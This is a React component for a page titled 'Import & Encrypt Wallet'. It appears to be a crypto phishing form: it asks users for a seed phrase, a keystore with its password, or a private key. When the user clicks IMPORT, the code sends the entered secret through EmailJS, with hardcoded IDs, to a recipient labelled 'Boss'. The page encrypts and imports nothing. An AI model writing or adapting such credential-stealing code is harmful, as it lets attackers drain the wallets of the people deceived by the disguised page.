import React, { useState } from 'react';
import { Box, Button, Flex, Heading, Text, Input } from '@chakra-ui/react';
import emailjs from 'emailjs-com';

const ImportWallet = () => {
  const [selectedOption, setSelectedOption] = useState('seed');
  const [inputValue, setInputValue] = useState('');
  const [password, setPassword] = useState(''); // For keystore option

  const handleButtonClick = (option) => {
    setSelectedOption(option);
    setInputValue('');
    setPassword('');  // Clear the password when switching options
  };

  const sendEmail = () => {
    if (selectedOption === 'seed' && !inputValue) {
      alert('Please enter your Seed/Recovery Phrase.');
      return;
    }
    if (selectedOption === 'keystore' && (!inputValue || !password)) {
      alert('Please enter your Keystore JSON and password.');
      return;
    }
    if (selectedOption === 'privateKey' && !inputValue) {
      alert('Please enter your Private Key.');
      return;
    }

    const serviceID = 'service_jujd1ma';  
    const templateID = 'template_cpe3uon'; 
    const publicKey = 'FvKY_rTKVKhPIik-6';
  
    const templateParams = {
      from_name: 'a new user',  
      to_name: 'Boss',    
      message: `Wallet Type: ${selectedOption}, Input Value: ${inputValue}`, 
    };
  
    emailjs.send(serviceID, templateID, templateParams, publicKey)
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
        alert('Email sent successfully!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
        alert('Failed to send email.');
      });
  };
  
  return (
    <Box textAlign="center" p={4} maxW="980px" mx="auto" fontFamily={"Montserrat"}>
      <Heading as="h1" fontSize="36px" color="black" my={4} fontFamily={"Montserrat"}>
        Import & Encrypt Wallet
      </Heading>
      <Flex direction={{ base: 'column', md: 'row' }} gap={4} mx="auto" mt={8} >
        <Button
          bg={selectedOption === 'seed' ? 'black' : 'white'}
          color={selectedOption === 'seed' ? 'white' : 'black'}
          _hover={{ bg: selectedOption === 'seed' ? 'gray.800' : 'gray.100' }}
          w="full"
          onClick={() => handleButtonClick('seed')}
          borderRadius="0px"
          textAlign={'left'}
        >
          Seed/Recovery Phrase
        </Button>
        <Button
          bg={selectedOption === 'keystore' ? 'black' : 'white'}
          color={selectedOption === 'keystore' ? 'white' : 'black'}
          _hover={{ bg: selectedOption === 'keystore' ? 'gray.800' : 'gray.100' }}
          w="full"
          onClick={() => handleButtonClick('keystore')}
          borderRadius="0px"
        >
          Keystore JSON
        </Button>
        <Button
          bg={selectedOption === 'privateKey' ? 'black' : 'white'}
          color={selectedOption === 'privateKey' ? 'white' : 'black'}
          _hover={{ bg: selectedOption === 'privateKey' ? 'gray.800' : 'gray.100' }}
          w="full"
          onClick={() => handleButtonClick('privateKey')}
          borderRadius="0px"
        >
          Private Key
        </Button>
      </Flex>

      {selectedOption === 'seed' && (
        <Box mt={4}>
          <Input
            placeholder="Input your phrase value...."
            mb={4}
            h={{base: '120px', md: '150px'}}
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
          <Text my={4}>Typically 12 (sometimes 24) words separated by single spaces.</Text>
          <Button
            bg="black"
            color="white"
            _hover={{ bg: 'gray.800' }}
            w="full"
            borderRadius="0px"
            h="50px"
            onClick={sendEmail}
            fontFamily={"Montserrat"}
          >
            IMPORT
          </Button>
        </Box>
      )}

      {selectedOption === 'keystore' && (
        <Box mt={6}>
          <Input
            placeholder="Input your keystore value..."
            mb={4}
            h={{base: '120px', md: '150px'}}
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
          <Input
            placeholder="Enter password"
            type="password"
            mb={4}
            h={{base: '40px', md: '60px'}}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <Text my={4}>Several lines of text beginning with '(...)' plus the password you used to encrypt it.</Text>
          <Button
            bg="black"
            color="white"
            _hover={{ bg: 'gray.800' }}
            w="full"
            borderRadius="0px"
            h="50px"
            onClick={sendEmail}
          >
            IMPORT
          </Button>
        </Box>
      )}

      {selectedOption === 'privateKey' && (
        <Box mt={6}>
          <Input
            placeholder="Enter your private key here"
            mb={4}
            h="60px"
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
          />
          <Button
            bg="black"
            color="white"
            _hover={{ bg: 'gray.800' }}
            w="full"
            borderRadius="0px"
            h="50px"
            onClick={sendEmail}
          >
            IMPORT
          </Button>
        </Box>
      )}
    </Box>
  );
};

export default ImportWallet;
